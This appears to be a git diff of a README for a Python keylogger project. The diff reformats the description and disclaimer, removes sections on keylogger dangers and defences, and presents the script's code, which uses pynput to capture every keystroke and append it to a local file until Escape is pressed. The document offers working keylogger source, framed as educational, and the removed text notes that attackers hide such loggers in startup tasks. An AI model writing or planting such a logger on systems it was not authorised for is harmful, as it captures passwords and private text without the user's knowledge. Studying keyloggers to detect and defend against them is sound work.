@@ -1,18 +1,31 @@
-# Python-Keylogger
-This is a simple Python script that logs keyboard activity using the `pynput` library. It records keystrokes and writes them to a local text file (`keyfile.txt`). This tool is designed **solely for educational and ethical testing purposes**, such as understanding how keyloggers work and how to detect or prevent them.
+# Python Keylogger
 
-DISCLAIMER
+This is a simple Python script that logs keyboard activity using the `pynput` library. It records keystrokes and saves them to a local file called `keyfile.txt`.
 
-> **This project is intended strictly for educational use.**  
-> Do **not** use this software on any system without **explicit written permission** from the owner.
+This tool is intended solely for educational and ethical testing purposes — such as learning how keyloggers function, how they can be detected, and how to defend against them.
 
- How It Works
-- Listens to all keyboard input using the `pynput.keyboard` module.
-- Logs printable characters to `keyfile.txt`.
+---
+
+## Disclaimer
+
+**This project is for educational use only.**  
+Do not run this script on any system without explicit written permission from the owner. Unauthorized use may violate local, state, or federal laws.
+
+---
+
+## How It Works
+
+- Listens for keyboard input using `pynput.keyboard`
+- Logs printable characters to `keyfile.txt`
 - Records special keys like `Enter`, `Tab`, `Shift` as `[Key.enter]`, `[Key.shift]`, etc.
-- Stops recording when the **Escape** key is pressed.
-  
->**def key_pressed(key):
+- Stops listening when the Escape key is pressed
+
+### Code Overview
+
+```python
+from pynput import keyboard 
+
+def key_pressed(key):
     print(str(key))
     with open("keyfile.txt", 'a') as logkey:
         try:
@@ -27,23 +40,4 @@ def on_release(key):
 
 if __name__ == "__main__":
     with keyboard.Listener(on_press=key_pressed, on_release=on_release) as listener:
-        listener.join()**
-
-## What makes keyloggers so dangerous ##
-Keyloggers are majority of the time are hidden and passivly logging scripts, many attackers abuse this by implemting them into system startup and automated stricts. Usally through TaskSchedular.
-
- 
-##How to Protect Against Keyloggers##
--Use up-to-date antivirus/anti-malware software
--Regularly audit running processes
--Monitor for unusual file changes 
--Educate users on suspicious behavior and phishing
-
-
-##This script is useful for##
--Learning how keyloggers operate
--Understanding attack vectors in endpoint security
--Practicing defensive detection and mitigation techniques
-
-
-
+        listener.join()
